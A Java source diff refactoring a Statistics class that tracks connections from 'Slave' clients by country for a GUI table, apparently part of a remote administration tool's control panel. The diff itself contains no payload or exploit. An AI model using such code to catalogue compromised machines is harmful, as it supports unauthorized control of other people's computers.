@@ -5,23 +5,34 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.io.Serializable;
 import java.util.ArrayList;
+import java.util.List;
 
 import com.redpois0n.io.Files;
 import com.redpois0n.ui.frames.Frame;
 import com.redpois0n.utils.FlagUtils;
 import com.redpois0n.utils.IconUtils;
 
+public class Statistics extends AbstractSettings {
 
-public class Statistics {
+	private static final Statistics instance = new Statistics();
 
-	public static ArrayList<StatEntry> list = new ArrayList<StatEntry>();
+	private List<StatEntry> list = new ArrayList<StatEntry>();
 
-	public static boolean isTracking() {
-		return Settings.getBoolean("stats");
+	public static Statistics getGlobal() {
+		return instance;
 	}
 
-	public static StatEntry getEntry(String country, String longcountry) {
+	public static boolean isTracking() {
+		return Settings.getGlobal().getBoolean("stats");
+	}
+	
+	public List<StatEntry> getList() {
+		return list;
+	}
+
+	public StatEntry getEntry(String country, String longcountry) {
 		for (int i = 0; i < list.size(); i++) {
 			StatEntry entry = list.get(i);
 			if (entry != null && entry.country != null && entry.connects != null && entry.longcountry.equalsIgnoreCase(longcountry) && entry.country.equalsIgnoreCase(country)) {
@@ -32,50 +43,36 @@ public class Statistics {
 		StatEntry stat = new StatEntry();
 		stat.country = country;
 		stat.longcountry = longcountry;
-		
+
 		list.add(stat);
 		return stat;
 	}
 
+	@Override
 	@SuppressWarnings("unchecked")
-	public static void load() {
+	public void load() throws Exception {
 		if (!isTracking()) {
 			return;
 		}
-		try {
-			ObjectInputStream str = new ObjectInputStream(new FileInputStream(new File(Files.getSettings(), "stats.dat")));
-			list = (ArrayList<StatEntry>) str.readObject();
-			str.close();
-			reload();
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
+
+		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
+		list = (ArrayList<StatEntry>) str.readObject();
+		str.close();
+		reload();
 	}
 
-	public static void save() {
+	public void save() throws Exception {
 		if (!isTracking()) {
 			return;
 		}
-		try {
-			ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(new File(Files.getSettings(), "stats.dat")));
-			str.writeObject(list);
-			str.close();
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
+
+		ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(getFile()));
+		str.writeObject(list);
+		str.close();
+
 	}
 
-	public static void saveEmpty() {
-		try {
-			ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(new File(Files.getSettings(), "stats.dat")));
-			str.writeObject(new ArrayList<StatEntry>());
-			str.close();
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
-	}
-
-	public static void add(Slave client) {
+	public void add(Slave client) {
 		if (!isTracking()) {
 			return;
 		}
@@ -83,7 +80,7 @@ public class Statistics {
 		StatEntry entry;
 
 		entry = getEntry(client.getCountry(), client.getCountry());
-			
+
 		entry.connects++;
 		boolean exists = false;
 		for (String str : entry.list) {
@@ -97,7 +94,7 @@ public class Statistics {
 		reload();
 	}
 
-	public static void reload() {
+	public void reload() {
 		try {
 			while (Frame.statModel.getRowCount() > 0) {
 				Frame.statModel.removeRow(0);
@@ -105,17 +102,17 @@ public class Statistics {
 			if (!isTracking()) {
 				return;
 			}
-			Frame.statModel.addRow(new Object[] { IconUtils.getIcon("all", true), "Total: " + list.size(), "Total: " + getNoConnects(), "Total: " + getDifConnects() });
+			Frame.statModel.addRow(new Object[] { IconUtils.getIcon("all", true), "Total: " + list.size(), "Total: " + getNoConnects(), "Total: " + getDifferentConnects() });
 			for (StatEntry e : list) {
 				String latest = e.list.size() > 0 ? e.list.get(0) : "None";
 				Frame.statModel.addRow(new Object[] { FlagUtils.getFlag(e.country), e.longcountry, e.connects.toString(), e.list.size(), latest });
 			}
 		} catch (Exception ex) {
-			// ex.printStackTrace();
+			//ex.printStackTrace();
 		}
 	}
 
-	public static int getNoConnects() {
+	public int getNoConnects() {
 		int no = 0;
 		for (StatEntry e : list) {
 			no += e.connects;
@@ -123,12 +120,60 @@ public class Statistics {
 		return no;
 	}
 
-	public static int getDifConnects() {
+	public int getDifferentConnects() {
 		int no = 0;
 		for (StatEntry e : list) {
 			no += e.list.size();
 		}
 		return no;
+	}
+
+	public class StatEntry implements Serializable {
+
+		private static final long serialVersionUID = 8462429809223243541L;
+
+		private String country = "Unknown";
+		private String longcountry = "Unknown";
+		private Integer connects = 0;
+		private List<String> list = new ArrayList<String>();
+
+		public String getCountry() {
+			return country;
+		}
+
+		public void setCountry(String country) {
+			this.country = country;
+		}
+
+		public String getLongCountry() {
+			return longcountry;
+		}
+
+		public void setLongCountry(String longcountry) {
+			this.longcountry = longcountry;
+		}
+
+		public int getConnects() {
+			return connects;
+		}
+
+		public void setConnects(int connects) {
+			this.connects = connects;
+		}
+
+		public List<String> getList() {
+			return list;
+		}
+
+		public void setList(List<String> list) {
+			this.list = list;
+		}
+
+	}
+	
+	@Override
+	public File getFile() {
+		return new File(Files.getSettings(), "stats.dat");
 	}
 
 }
